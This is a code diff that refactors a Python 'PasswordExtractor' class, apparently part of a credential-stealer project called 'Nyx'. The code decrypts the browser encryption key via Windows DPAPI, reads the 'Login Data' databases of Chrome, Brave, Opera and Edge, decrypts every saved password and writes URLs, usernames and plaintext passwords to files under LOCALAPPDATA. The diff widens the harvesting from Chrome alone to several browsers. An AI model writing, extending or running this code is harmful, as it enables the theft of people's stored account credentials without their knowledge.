@@ -2,33 +2,48 @@ import os
 import shutil
 import sqlite3
 import base64
-import json  
+import json
 from Crypto.Cipher import AES
 from win32crypt import CryptUnprotectData
 
-class PasswordExtractor:
-    def __init__(self, browser_path):
-        self.BrowserPath = browser_path
 
-    def GetEncryptionKey(self) -> bytes:
+class PasswordExtractor:
+    def __init__(self, browser_name: str):
+        self.browser_name = browser_name
+        self.browser_path = self.get_browser_path()
+
+    def get_browser_path(self) -> str:
+        paths = {
+            "chrome": os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data",
+            "brave": os.path.expanduser("~") + r"\AppData\Local\BraveSoftware\Brave-Browser\User Data",
+            "opera": os.path.expanduser("~") + r"\AppData\Roaming\Opera Software\Opera Stable",
+            "edge": os.path.expanduser("~") + r"\AppData\Local\Microsoft\Edge\User Data",
+            "firefox": os.path.expanduser("~") + r"\AppData\Roaming\Mozilla\Firefox\Profiles"
+        }
+        return paths.get(self.browser_name.lower(), "")
+
+    def get_encryption_key(self) -> bytes:
         try:
-            local_state_path = os.path.join(self.BrowserPath, "Local State")
-            
+            if self.browser_name == "firefox":
+                return None
+
+            local_state_path = os.path.join(self.browser_path, "Local State")
+
             with open(local_state_path, 'r', encoding='utf-8') as file:
                 local_state_data = json.load(file)
-            
+
             encrypted_key = local_state_data["os_crypt"]["encrypted_key"]
-            
-            encrypted_key = base64.b64decode(encrypted_key)[5:]  
-            
+
+            encrypted_key = base64.b64decode(encrypted_key)[5:]
+
             decrypted_key = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
-            
+
             return decrypted_key
         except Exception as e:
             print(f"Erro ao obter a chave de criptografia: {e}")
             return None
 
-    def Decrypt(self, encrypted_password: bytes, key: bytes) -> str:
+    def decrypt_password(self, encrypted_password: bytes, key: bytes) -> str:
         try:
             iv = encrypted_password[3:15]
             encrypted_password = encrypted_password[15:]
@@ -39,26 +54,26 @@ class PasswordExtractor:
             print(f"Erro ao descriptografar: {e}")
             return ""
 
-    def GetPasswords(self) -> list[tuple[str, str, str]]:
-        encryptionKey = self.GetEncryptionKey()
+    def get_passwords_chromium(self) -> list[tuple[str, str, str]]:
+        encryption_key = self.get_encryption_key()
         passwords = list()
 
-        if encryptionKey is None:
+        if encryption_key is None:
             print("Chave de criptografia não encontrada.")
             return passwords
 
-        loginFilePaths = list()
+        login_file_paths = list()
 
-        for root, _, files in os.walk(self.BrowserPath):
+        for root, _, files in os.walk(self.browser_path):
             for file in files:
                 if file.lower() == "login data":
                     filepath = os.path.join(root, file)
-                    loginFilePaths.append(filepath)
+                    login_file_paths.append(filepath)
 
-        for path in loginFilePaths:
+        for path in login_file_paths:
             while True:
                 tempfile = os.path.join(
-                    os.getenv("TEMP"), self.GetRandomString(10) + ".tmp"
+                    os.getenv("TEMP"), self.get_random_string(10) + ".tmp"
                 )
                 if not os.path.isfile(tempfile):
                     break
@@ -79,7 +94,7 @@ class PasswordExtractor:
                 ).fetchall()
 
                 for url, username, encrypted_password in results:
-                    password = self.Decrypt(encrypted_password, encryptionKey)
+                    password = self.decrypt_password(encrypted_password, encryption_key)
 
                     if url and username and password:
                         passwords.append((url, username, password))
@@ -93,10 +108,15 @@ class PasswordExtractor:
 
         return passwords
 
-    def GetRandomString(self, length: int) -> str:
+    def get_passwords_firefox(self) -> list[tuple[str, str, str]]:
+        # Implementar a lógica específica para Firefox, acessar o arquivo logins.json e descriptografar com key4.db
+        print("Extração para Firefox ainda não implementada.")
+        return []
+
+    def get_random_string(self, length: int) -> str:
         return base64.urlsafe_b64encode(os.urandom(length)).decode()[:length]
 
-    def SavePasswordsToFile(self, passwords: list[tuple[str, str, str]], file_path: str) -> None:
+    def save_passwords_to_file(self, passwords: list[tuple[str, str, str]], file_path: str) -> None:
         try:
             with open(file_path, 'w', encoding='utf-8') as file:
                 for url, username, password in passwords:
@@ -105,18 +125,29 @@ class PasswordExtractor:
         except Exception as e:
             print(f"Erro ao salvar senhas em arquivo: {e}")
 
-if __name__ == "__main__":
-    browser_path = os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data"
-    extractor = PasswordExtractor(browser_path)
+    def get_passwords(self) -> list[tuple[str, str, str]]:
+        if self.browser_name in ["chrome", "brave", "opera", "edge"]:
+            return self.get_passwords_chromium()
+        elif self.browser_name == "firefox":
+            return self.get_passwords_firefox()
+        else:
+            print(f"Navegador {self.browser_name} não suportado.")
+            return []
 
-    passwords = extractor.GetPasswords()
-    
-    if passwords:
-        nyx_path = os.path.join(os.getenv("LOCALAPPDATA"), "Nyx")
-        if not os.path.exists(nyx_path):
-            os.makedirs(nyx_path)
-        
-        passwords_file_path = os.path.join(nyx_path, "passwords.txt")
-        extractor.SavePasswordsToFile(passwords, passwords_file_path)
-    else:
-        print("Nenhuma senha encontrada.")
+
+if __name__ == "__main__":
+    browsers = ["chrome", "brave", "opera", "edge", "firefox"]
+
+    for browser in browsers:
+        extractor = PasswordExtractor(browser)
+        passwords = extractor.get_passwords()
+
+        if passwords:
+            nyx_path = os.path.join(os.getenv("LOCALAPPDATA"), "Nyx")
+            if not os.path.exists(nyx_path):
+                os.makedirs(nyx_path)
+
+            passwords_file_path = os.path.join(nyx_path, f"{browser}_passwords.txt")
+            extractor.save_passwords_to_file(passwords, passwords_file_path)
+        else:
+            print(f"Nenhuma senha encontrada para {browser}.")
